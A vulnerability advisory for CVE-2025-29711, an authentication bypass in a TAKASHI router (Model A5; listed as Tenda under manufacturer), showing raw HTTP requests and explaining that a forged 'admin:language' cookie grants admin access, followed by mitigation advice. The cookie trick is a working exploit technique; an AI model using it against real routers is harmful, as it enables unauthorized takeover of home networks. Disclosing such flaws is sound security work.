# TAKASHI Wireless Instant Router and Repeater - Incorrect Access Control CVE-2025-29711

## Overview
A critical authentication bypass vulnerability has been identified in the TAKASHI Wireless Instant Router and Repeater (Model A5) running firmware version **V5.07.38_AAL03** with hardware version **V3.0**. This vulnerability allows unauthorized users to gain administrative access due to improper session management.

## Affected Model
- **Model**: A5
- **Manufacturer**: Tenda 
- **Software Version**: V5.07.38_AAL03  
- **Hardware Version**: V3.0  

## Vulnerability Details
Improper session management in Takashi Wireless Instant Router and
Repeater (Model A5) firmware v5.07.38_AAL03 with hardware v3.0 allows
unauthorized attackers to gain admin-level access via a crafted
request.
## Request Comparison
To understand how this vulnerability works, let's compare an unauthenticated request to an authenticated request.

### Unauthenticated Request
```
POST /LoginCheck HTTP/1.1
Host: 192.168.2.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.2.1/login.asp
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Origin: http://192.168.2.1
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Cookie: language=en
Upgrade-Insecure-Requests: 1
Priority: u=0, i

Username=admin&checkEn=0&Password=whatsthepassword
```

### Authenticated Request
```
GET /wireless_basic.asp HTTP/1.1
Host: 192.168.2.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.2.1/advance.asp
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Cookie: language=en; admin:language=en
Upgrade-Insecure-Requests: 1
Priority: u=4
```

## Key Difference
The key difference between the two requests is the presence of the following cookie:
```
admin:language=en
```

## The Vulnerability
The application trusts the `admin:language` cookie without properly verifying session authentication. By simply adding this cookie with an arbitrary value, an unauthenticated user can gain full administrative access.

### Exploit Mechanics
An attacker can exploit this vulnerability by setting the following cookie:
```
admin:language=<any_value>
```
Where `<any_value>` can be any string, text, or number. As long as the cookie is present, the application will treat the user as an authenticated admin.

## Impact
- Unauthorized users can gain admin-level access without valid credentials.
- Attackers can modify router settings, expose sensitive data, and potentially disrupt network operations.
- No brute-force or credential stuffing is neededâ€”just cookie manipulation.

## Mitigation
To mitigate this issue, the following steps should be taken:
1. **Proper Session Management**: Implement server-side session validation instead of relying on client-side cookies.
2. **Token-Based Authentication**: Use secure session tokens that cannot be forged.
3. **Session Expiry**: Ensure sessions expire and require re-authentication after a set period.
4. **Cookie Integrity Checks**: Validate cookies against an active session in the backend database.
